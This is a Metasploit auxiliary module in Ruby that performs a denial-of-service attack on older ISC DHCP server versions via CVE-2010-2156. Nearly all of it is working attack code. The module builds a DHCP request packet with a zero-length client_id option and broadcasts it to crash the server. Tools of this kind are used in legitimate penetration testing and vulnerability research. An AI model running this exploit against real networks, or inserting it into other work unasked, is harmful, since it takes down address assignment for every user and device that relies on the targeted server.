##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Dos
  include Msf::Exploit::Capture

  def initialize
    super(
      'Name'          => 'ISC DHCP Zero Length ClientID Denial of Service Module',
      'Description'   => %q{
          This module performs a Denial of Service Attack against the ISC DHCP server,
        versions 4.1 before 4.1.1-P1 and 4.0 before 4.0.2-P1. It sends out a DHCP Request
        message with a 0-length client_id option for an IP address on the appropriate range
        for the dhcp server. When ISC DHCP Server tries to hash this value it exits
        abnormally.
      },
      'Author'        =>
          [
            'sid', # Original POC
            'theLightCosine' # msf module
          ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          [ 'CVE', '2010-2156' ],
          [ 'OSVDB', '65246'],
          [ 'EDB', '14185']
        ]
    )
    register_options(
      [
        OptAddress.new('RIP', [true, 'A valid IP to request from the server'])
      ]
    )
    deregister_options('RHOST','FILTER','PCAPFILE','SNAPLEN','TIMEOUT')
  end

  def run
    open_pcap
    print_status("Creating DHCP Request with 0-length ClientID")
    p = PacketFu::UDPPacket.new
    p.ip_daddr = "255.255.255.255"
    p.udp_sport = 68
    p.udp_dport = 67

    # TODO: Get a DHCP parser into PacketFu
    chaddr = "\xaa\xaa\xaa\xaa\xaa\xaa"
    dhcp_payload = "\x63\x82\x53\x63\x35\x01\x03\x3d\x00\xff"
    p.payload = dhcp_req(chaddr,dhcp_payload)
    p.recalc
    print_status("Sending malformed DHCP request...")
    capture_sendto(p, '255.255.255.255')
    close_pcap
  end

  def dhcp_req(chaddr,payload)
    req = "\x00" * 236
    req[0,3] = "\x01\x01\x06" # Boot request on Eth with hw len of 6
    req[12,4] = Rex::Socket.addr_aton(datastore['RIP'])
    req[28,6] = chaddr
    req + payload
  end
end
